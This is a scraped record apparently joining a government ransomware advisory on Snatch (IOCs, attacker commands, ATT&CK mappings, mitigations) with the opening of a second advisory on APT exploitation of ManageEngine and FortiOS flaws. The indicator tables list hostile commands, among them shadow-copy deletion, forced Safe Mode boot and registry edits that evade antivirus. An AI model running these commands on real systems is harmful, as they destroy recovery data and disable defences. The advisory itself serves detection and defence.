510e9fa38a08d446189c34fe6125295f410b36f00aceb65e7b4508e9d7c4e1d1


WRSA.exe
ed0fd61bf82660a69f5bfe0e66457cfe56d66dd2b310e9e97657c37779aef65d


ghnhfglwaplf.bat
2155a029a024a2ffa4eff9108ac15c7db527ca1c8f89ccfd94cc3a70b77cfc57


nllraq.bat
251427c578eaa814f07037fbe6e388b3bc86ed3800d7887c9d24e7b94176e30d


ygariiwfenmqteiwcr.bat
3295f5029f9c9549a584fa13bc6c25520b4ff9a4b2feb1d9e935cc9e4e0f0924


bsfyqgqeauegwyfvtp.bat
6c9d8c577dddf9cc480f330617e263a6ee4461651b4dec1f7215bda77df911e7


rgibdcghzwpk.bat
84e1476c6b21531de62bbac67e52ab2ac14aa7a30f504ecf33e6b62aa33d1fe5


pxyicmajjlqrtgcnhi.bat
a80c7fe1f88cf24ad4c55910a9f2189f1eedad25d7d0fd53dbfe6bdd68912a84


evhgpp.bat
b998a8c15cc19c8c31c89b30f692a40b14d7a6c09233eb976c07f19a84eccb40


eqbglqcngblqnl.bat
1fbdb97893d09d59575c3ef95df3c929fe6b6ddf1b273283e4efadf94cdc802d


qesbdksdvnotrjnexutx.bat
0965cb8ee38adedd9ba06bdad9220a35890c2df0e4c78d0559cd6da653bf740f


HOW TO RESTORE YOUR FILES.TXT
 




Filenames with Associated SHA-1 Hashes


Filenames
SHA-1




safe.exe
c8a0060290715f266c89a21480fed08133ea2614




Commands Used by Snatch Threat Actors


Commands




wmiadap.exe /F /T /R


%windir%\System32\svchost.eve –k WerSvcGroup


conhost.exe 0xFFFFFFFF -ForceV1


vssadmin delete shadows /all /quiet


bcdedit.exe /set {current} safeboot minimal


REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\VSS /VE /T REG_SZ /F /D Service


REG ADD HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\mXoRpcSsx /VE /T REG_SZ /F /D Service


REG QUERY HKLM\SYSTEM\CurrentControlSet\Control /v SystemStartOptions


%CONHOST% ""1088015358-1778111623-1306428145949291561678876491840500802412316031-33820320


""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --flag-switches-begin --flag-switches-end --no-startup-window /prefetch:5


cmd /d /c cmd /d /c cmd /d /c start "" "" C:\Users\grade1\AppData\Local\PRETTYOCEANluvApplication\PRETTYOCEANApplicationidf.bi.




Registry Keys


Registry Keys




HKLM\SOFTWARE\Microsoft\Windows Media Player NSS\3.0\Servers\D8B548F0-E306-4B2B-BD82-25DAC3208786\FriendlyName


HKU\S-1-5-21-4270068108-2931534202-3907561125-1001\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Cached\{ED50FC29-B964-48A9-AFB3-15EBB9B97F36} {ADD8BA80-002B-11D0-8F0F-00C04FD7D062} 0xFFFF




System Log Changes


Source
Message




TerminalServices-RemoteConnectionManager
Remote session from client name exceeded the maximum allowed failed logon attempts. The session was forcibly terminated.


Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall
A rule was added (Event 2004) or modified (Event 2005) in the Windows Defender Firewall exception list. All rules included action “Allow” and rule name included “File and Printer Sharing”


Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall
A Windows Defender Firewall setting was changed in private, public, and domain profile with type “Enable Windows Defender Firewall” and value of “no”.


Microsoft-Windows-TaskScheduler%4Operational
Instance of process C:\Windows\svchost.exe. (Incorrect file location, should be C:\Windows\System32\svchost.exe)




Mutexes Created


Mutexes Created




\Sessions\1\BaseNamedObjects\gcc-shmem-tdm2-fc_key


\Sessions\1\BaseNamedObjects\gcc-shmem-tdm2-sjlj_once


\Sessions\1\BaseNamedObjects\gcc-shmem-tdm2-use_fc_key


gcc-shmem-tdm2-fc_key


gcc-hmem-tdm2-sjlj_once


gcc-shmem-tdm2-use_fc_key



MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 4-16 for all referenced threat actor tactics and techniques in this advisory.

Table 4: Snatch Threat Actors ATT&CK Techniques for Enterprise – Reconnaissance


Technique Title
ID
Use




Gather Victim Network Information
T1590
Snatch threat actors may gather information about the victim's networks that can be used during targeting.




Table 5: Snatch Threat Actors ATT&CK Techniques for Enterprise – Resource Development


Technique Title
ID
Use




Acquire Infrastructure: Virtual Private Server
T1583.003
Snatch threat actors may rent Virtual Private Servers (VPSs) that can be used during targeting. Snatch threat actors acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.




Table 6: Snatch Threat Actors ATT&CK Techniques for Enterprise – Initial Access


Technique Title
ID
Use




Valid Accounts
T1078
Snatch threat actors use compromised user credentials from criminal forums/marketplaces to gain access and maintain persistence on a victim’s network.


External Remote Services
T1133

Snatch threat actors exploit weaknesses in RDP to perform brute forcing and gain administrator credentials for a victim’s network.
Snatch threat actors use VPN services to connect to a victim’s network.





Table 7: Snatch Threat Actors ATT&CK Techniques for Enterprise – Execution


Technique Title
ID
Use




Command and Scripting Interpreter: Windows Command Shell
T1059.003
Snatch threat actors may use batch files (.bat) during ransomware execution and data discovery.


System Services: Service Execution
T1569.002
Snatch threat actors may leverage various Windows tools to enumerate systems on the victim’s network. Snatch ransomware used sc.exe.




Table 8: Snatch Threat Actors ATT&CK Techniques for Enterprise – Persistence


Technique Title
ID
Use




Valid Accounts: Domain Accounts
T1078.002
Snatch threat actors compromise domain accounts to maintain persistence on a victim’s network.




Table 9: Snatch Threat Actors ATT&CK Techniques for Enterprise – Defense Evasion


Technique Title
ID
Use




Masquerading
T1036
Snatch threat actors have the ransomware executable match the SHA-256 hash of a legitimate file to avoid rule-based detection.


Indicator Removal: File Deletion
T1070.004
Snatch threat actors delete batch files from a victim’s filesystem once execution is complete.


Modify Registry
T1112
Snatch threat actors modify Windows Registry keys to aid in persistence and execution.


Impair Defenses: Disable or Modify Tools
T1562.001
Snatch threat actors have attempted to disable a system’s antivirus program to enable persistence and ransomware execution.


Impair Defenses: Safe Mode Boot
T1562.009
Snatch threat actors abuse Windows Safe Mode to circumvent detection by antivirus or endpoint protection and encrypt files when few services are running.




Table 10: Snatch Threat Actors ATT&CK Techniques for Enterprise – Credential Access


Technique Title
ID
Use




Brute Force: Password Guessing
T1110.001
Snatch threat actors use brute force to obtain administrator credentials for a victim’s network.




Table 11: Snatch Threat Actors ATT&CK Techniques for Enterprise – Discovery


Technique Title
ID
Use




Query Registry
T1012
Snatch threat actors may interact with the Windows Registry to gather information about the system, configuration, and installed software.


Process Discovery
T1057
Snatch threat actors search for information about running processes on a system.




Table 12: Snatch Threat Actors ATT&CK Techniques for Enterprise – Lateral Movement


Technique Title
ID
Use




Remote Services: Remote Desktop Protocol
T1021.001
Snatch threat actors may use Valid Accounts to log into a computer using the Remote Desktop Protocol.




Table 13: Snatch Threat Actors ATT&CK Techniques for Enterprise – Collection


Technique Title
ID
Use




Data from Local System
T1005
Snatch threat actors search systems to find files and folders of interest prior to exfiltration.




Table 14: Snatch Threat Actors ATT&CK Techniques for Enterprise – Command and Control


Technique Title
ID
Use




Application Layer Protocols: Web Protocols
T1071.001
Snatch threat actors establish connections over port 443 to blend C2 traffic in with other web traffic.




Table 15: Snatch Threat Actors ATT&CK Techniques for Enterprise – Exfiltration


Technique Title
ID
Use




Exfiltration
TA0010
Snatch threat actors use exfiltration techniques to steal data from a victim’s network.




Table 16: Snatch Threat Actors ATT&CK Techniques for Enterprise – Impact


Technique Title
ID
Use




Data Encrypted for Impact
T1486
Snatch threat actors encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources.


Inhibit System Recovery
T1490
Snatch threat actors delete all volume shadow copies from a victim’s filesystem to inhibit system recovery.



MITIGATIONS




These mitigations apply to all stakeholders. The authoring agencies recommend that software manufactures incorporate secure-by-design and -default principles and tactics into their software development practices for hardening software against ransomware attacks (e.g., to prevent threat actors from using Safe Mode to evade detection and file encryption), thus strengthening the secure posture for their customers.
For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.




The FBI and CISA recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of the Snatch threat actor’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Reduce threat of malicious actors using remote access tools by:

Auditing remote access tools on your network to identify currently used and/or authorized software.
Reviewing logs for execution of remote access software to detect abnormal use of programs running as a portable executable [CPG 2.T].
Using security software to detect instances of remote access software being loaded only in memory.
Requiring authorized remote access solutions to be used only from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs).
Blocking both inbound and outbound connections on common remote access software ports and protocols at the network perimeter.


Implement application controls to manage and control execution of software, including allowlisting remote access programs.

Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions [CPG 2.N].
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts [CPG 4.C].
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP) [CPG 2.E].
Reduce the threat of credential compromise via the following:

Place domain admin accounts in the protected users’ group to prevent caching of password hashes locally.
Refrain from storing plaintext credentials in scripts.


Implement time-based access for accounts set at the admin level and higher [CPG 2.A, 2.E].

In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices [CPG 2.R].
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Use longer passwords consisting of at least eight characters and no more than 64 characters in length [CPG 2.B].
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords [CPG 2.C].
Implement multiple failed login attempt account lockouts [CPG 2.G].
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems [CPG 2.H].
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement [CPG 2.F].
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic and activity, including lateral movement, on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host [CPG 3.A].
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports and protocols [CPG 2.V].
Consider adding an email banner to emails received from outside your organization [CPG 2.M].
Disable hyperlinks in received emails.
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K, 2.L, 2.R].

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 4-16).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: #StopRansomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from IP addresses, a sample ransom note, communications with Snatch threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA strongly discourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3) at ic3.gov, a local FBI Field Office, or to CISA at report@cisa.gov or 1-844-Say-CISA (1-844-729-2472).
REFERENCES
[1] DataBreaches.net
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI and CISA do not endorse any commercial entity, product, or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI or CISA.
VERSION HISTORY
September 20, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1562.001', 'T1569.002', 'T1490', 'T1005', 'TA0010', 'T1112', 'T1590', 'T1562.009', 'T1078.002', 'T1078', 'T1070.004', 'T1057', 'T1583.003', 'T1133', 'T1012', 'T1110.001', 'T1021.001', 'T1071.001', 'T1486', 'T1059.003', 'T1036'}","






Actions to take today to mitigate malicious cyber activity:




Secure and closely monitor Remote Desktop Protocol (RDP).
Maintain offline backups of data.
Enable and enforce phishing-resistant multifactor authentication (MFA).







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known ransomware IOCs and TTPs associated with the Snatch ransomware variant identified through FBI investigations as recently as June 1, 2023.
Since mid-2021, Snatch threat actors have consistently evolved their tactics to take advantage of current trends in the cybercriminal space and leveraged successes of other ransomware variants’ operations. Snatch threat actors have targeted a wide range of critical infrastructure sectors including the Defense Industrial Base (DIB), Food and Agriculture, and Information Technology sectors. Snatch threat actors conduct ransomware operations involving data exfiltration and double extortion. After data exfiltration often involving direct communications with victims demanding ransom, Snatch threat actors may threaten victims with double extortion, where the victims’ data will be posted on Snatch’s extortion blog if the ransom goes unpaid.
FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Download the PDF version of this report:


AA23-263A.pdf
(PDF,       578.71 KB
  )


For a downloadable copy of IOCs, see:


AA23-263A STIX XML
(XML,       79.84 KB
  )




AA23-263A STIX JSON
(JSON,       56.10 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
First appearing in 2018, Snatch operates a ransomware-as-a-service (RaaS) model and claimed their first U.S.-based victim in 2019. Originally, the group was referred to as Team Truniger, based on the nickname of a key group member, Truniger, who previously operated as a GandCrab affiliate. Snatch threat actors use a customized ransomware variant notable for rebooting devices into Safe Mode, enabling the ransomware to circumvent detection by antivirus or endpoint protection, and then encrypting files when few services are running.
Snatch threat actors have been observed purchasing previously stolen data from other ransomware variants in an attempt to further exploit victims into paying a ransom to avoid having their data released on Snatch’s extortion blog. Note: Since November 2021, an extortion site operating under the name Snatch served as a clearinghouse for data exfiltrated or stolen from victim companies on Clearnet and TOR hosted by a bulletproof hosting service. In August 2023, individuals claiming to be associated with the blog gave a media interview claiming the blog was not associated with Snatch ransomware and “none of our targets has been attacked by Ransomware Snatch…”, despite multiple confirmed Snatch victims’ data appearing on the blog alongside victims associated with other ransomware groups, notably Nokoyawa and Conti.,1,
Initial Access and Persistence
Snatch threat actors employ several different methods to gain access to and maintain persistence on a victim’s network. Snatch affiliates primarily rely on exploiting weaknesses in Remote Desktop Protocol (RDP), for brute-forcing and gaining administrator credentials to victims’ networks,. In some instances, Snatch affiliates have sought out compromised credentials from criminal forums/marketplaces,.
Snatch threat actors gain persistence on a victim’s network by compromising an administrator account, and establishing connections over port 443, to a command and control (C2) server located on a Russian bulletproof hosting service,. Per IP traffic from event logs provided by recent victims, Snatch threat actors initiated RDP connections from a Russian bulletproof hosting service and through other virtual private network (VPN) services,.
Data Discovery and Lateral Movement
Snatch threat actors were observed using different TTPs to discover data, move laterally, and search for data to exfiltrate. Snatch threat actors use sc.exe to configure, query, stop, start, delete, and add system services using the Windows Command line. In addition to sc.exe, Snatch threat actors also use tools such as Metasploit and Cobalt Strike,S0154,.
Prior to deploying the ransomware, Snatch threat actors were observed spending up to three months on a victim’s system. Within this timeframe, Snatch threat actors exploited the victim’s network, moving laterally across the victim’s network with RDP, for the largest possible deployment of ransomware and searching for files and folders, for data exfiltration, followed by file encryption,.
Defense Evasion and Execution
During the early stages of ransomware deployment, Snatch threat actors attempt to disable antivirus software, and run an executable as a file named safe.exe or some variation thereof. In recent victims, the ransomware executable’s name consisted of a string of hexadecimal characters which match the SHA-256 hash of the file in an effort to defeat rule-based detection,. Upon initiation, the Snatch ransomware payload queries and modifies registry keys, uses various native Windows tools to enumerate the system, finds processes, and creates benign processes to execute Windows batch (.bat) files,. In some instances, the program attempts to remove all the volume shadow copies from a system,. After the execution of the batch files, the executable removes the batch files from the victim’s filesystem,.
The Snatch ransomware executable appends a series of hexadecimal characters to each file and folder name it encrypts—unique to each infection—and leaves behind a text file titled HOW TO RESTORE YOUR FILES.TXT in each folder. Snatch threat actors communicate with their victims through email and the Tox communication platform based on identifiers left in ransom notes or through their extortion blog. Since November 2021, some victims reported receiving a spoofed call from an unknown female who claimed association with Snatch and directed them to the group’s extortion site. In some instances, Snatch victims had a different ransomware variant deployed on their systems, but received a ransom note from Snatch threat actors. As a result, the victims’ data is posted on the ransomware blog involving the different ransomware variant and on the Snatch threat actors’ extortion blog.
Indicators of Compromise (IOCs)
The Snatch IOCs detailed in this section were obtained through FBI investigations from September 2022 through June 2023.
Email Domains and Addresses
Since 2019, Snatch threat actors have used numerous email addresses to email victims. Email addresses used by Snatch threat actors are random but usually originate from one of the following domains listed in Tables 1 and 2:

Table 2 shows a list of legitimate email domains offering encrypted email services that have been used by Snatch threat actors. These email domains are all publicly available and legal. The use of these email domains by a threat actor should not be attributed to the email domains, absent specific articulable facts tending to show they are used at the direction or under the control of a threat actor.

The email addresses listed in Table 3 were reported by recent victims.









MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 4-16 for all referenced threat actor tactics and techniques in this advisory.













MITIGATIONS

The FBI and CISA recommend organizations implement the mitigations below to improve your organization’s cybersecurity posture on the basis of the Snatch threat actor’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Reduce threat of malicious actors using remote access tools by:

Auditing remote access tools on your network to identify currently used and/or authorized software.
Reviewing logs for execution of remote access software to detect abnormal use of programs running as a portable executable,CPG 2.T,.
Using security software to detect instances of remote access software being loaded only in memory.
Requiring authorized remote access solutions to be used only from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs).
Blocking both inbound and outbound connections on common remote access software ports and protocols at the network perimeter.


Implement application controls to manage and control execution of software, including allowlisting remote access programs.

Application controls should prevent installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example,CPG 2.W,:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Disable command-line and scripting activities and permissions,CPG 2.N,.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts,CPG 4.C,.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege (PoLP),CPG 2.E,.
Reduce the threat of credential compromise via the following:

Place domain admin accounts in the protected users’ group to prevent caching of password hashes locally.
Refrain from storing plaintext credentials in scripts.


Implement time-based access for accounts set at the admin level and higher,CPG 2.A, 2.E,.

In addition, the authoring authorities of this CSA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques, and to reduce the impact and risk of compromise by ransomware or data extortion actors:

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Maintain offline backups of data and regularly maintain backup and restoration (daily or weekly at minimum). By instituting this practice, an organization limits the severity of disruption to its business practices,CPG 2.R,.
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Use longer passwords consisting of at least eight characters and no more than 64 characters in length,CPG 2.B,.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords,CPG 2.C,.
Implement multiple failed login attempt account lockouts,CPG 2.G,.
Disable password “hints.”
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require phishing-resistant multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems,CPG 2.H,.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,.
Segment networks to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement,CPG 2.F,.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic and activity, including lateral movement, on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host,CPG 3.A,.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Disable unused ports and protocols,CPG 2.V,.
Consider adding an email banner to emails received from outside your organization,CPG 2.M,.
Disable hyperlinks in received emails.
Ensure all backup data is encrypted, immutable (i.e., ensure backup data cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K, 2.L, 2.R,.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. FBI and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 4-16).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: #StopRansomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from IP addresses, a sample ransom note, communications with Snatch threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA strongly discourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3) at ic3.gov, a local FBI Field Office, or to CISA at report@cisa.gov or 1-844-Say-CISA (1-844-729-2472).
REFERENCES,1, DataBreaches.net
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI and CISA do not endorse any commercial entity, product, or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI or CISA.
VERSION HISTORY
September 20, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-263a
19,"






Actions to take today to mitigate malicious cyber activity:




Patch all systems for known exploited vulnerabilities (KEVs), including firewall security appliances.
Monitor for unauthorized use of remote access software using endpoint detection tools.
Remove unnecessary (disabled) accounts and groups from the enterprise that are no longer needed, especially privileged accounts.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), and Cyber National Mission Force (CNMF) identified the presence of indicators of compromise (IOCs) at an Aeronautical Sector organization as early as January 2023. Analysts confirmed that nation-state advanced persistent threat (APT) actors exploited CVE-2022-47966 to gain unauthorized access to a public-facing application (Zoho ManageEngine ServiceDesk Plus), establish persistence, and move laterally through the network. This vulnerability allows for remote code execution on the ManageEngine application. Additional APT actors were also observed exploiting CVE-2022-42475 to establish presence on the organization’s firewall device.
CISA and co-sealers are releasing this joint Cybersecurity Advisory (CSA) to provide network defenders with tactics, techniques, and procedures (TTPs), IOCs, and methods to detect and protect against similar exploitation.
Download the PDF version of this report:


AA23-250A Actors Exploit CVE-2022-47966 and CVE-2022-42475
(PDF,       681.49 KB
  )


For a downloadable copy of IOCs, see:


AA23-250A STIX XML
(XML,       69.24 KB
  )




AA23-250A STIX JSON
(JSON,       69.89 KB
  )


For a downloadable copy of the Malware Analysis Report (MAR) accompanying this CSA, see:


MAR-10430311-1.v1 Multiple Nation-State Threat Actors Exploit CVE-2022-47966 and CVE-2022-42475
(PDF,       385.49 KB
  )


Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See Tables 3-13 for the APT actors’ activity mapped to MITRE ATT&CK tactics and techniques with corresponding mitigation and/or detection recommendations.
Overview
By request of the impacted organization, CISA conducted an incident response engagement from February to April 2023. CISA and co-sealers assess that beginning as early as January 2023, multiple nation-state APT actors were present on the organization’s network via at least two initial access vectors:

Initial Access Vector 1: APT actors exploited CVE-2022-47966 to access the organization’s web server hosting the public-facing application, Zoho ManageEngine ServiceDesk Plus.
Initial Access Vector 2: APT actors exploited CVE-2022-42475 to access the organization’s firewall device.

CISA and co-sealers identified an array of threat actor activity, to include overlapping TTPs across multiple APT actors. Per the activity conducted, APT actors often scan internet-facing devices for vulnerabilities that can be easily exploited. Firewall, virtual private networks (VPNs), and other edge network infrastructure continue to be of interest to malicious cyber actors. When targeted, they can be leveraged to expand targeted network access, serve as malicious infrastructure, or a mixture of both.
APT Actor Activity
Initial Access Vector 1
As early as January 2023, APT actors exploited CVE-2022-47966 [T1190] for initial access to the organization’s web server hosting the public-facing application, Zoho ManageEngine ServiceDesk Plus. CISA observed indications in log files that a connection to the known malicious IP address 192.142.226[.]153 was made as part of initial exploitation.
Through exploitation of CVE-2022-47966, APT actors achieved root level access on the web server and created a local user account [T1136.001] named Azure with administrative privileges [T1068]. Actors were further able to download malware, enumerate the network, collect administrative user credentials, and move laterally through the organization’s network. CISA and co-sealers were unable to determine if proprietary information was accessed, altered, or exfiltrated. This was due to the organization not clearly defining where their data was centrally located and CISA having limited network sensor coverage.
Initial Access Vector 2
Additional APT actors exploited CVE-2022-42475 on the organization’s firewall device, which was indicated by multiple successful VPN connections from known-malicious IPs between February 1-16, 2023. It was identified that APT actors compromised and used disabled, legitimate administrative account credentials [T1078.003] from a previously hired contractor—of which the organization confirmed the user had been disabled prior to the observed activity.
Analysis identified that a common behavior for these threat actors was to use disabled administrative account credentials and delete logs from several critical servers in the environment [T1070.001]. This prevented the ability to detect follow-on exploitation or data exfiltration. CISA and co-sealers were also unable to further track the activity due to the organization not having Network Address Translation (NAT) IP logging enabled.
APT actors initiated multiple Transport Layer Security (TLS)-encrypted sessions [T1573.002] on Transmission Control Protocol (TCP) port 10443 [T1571], indicating successful exchanges of data transfer from the firewall device. APT actors were observed connecting to the device from the following actor-controlled C2 IP addresses:

144.202.2[.]71
207.246.105[.]240
45.77.121[.]232
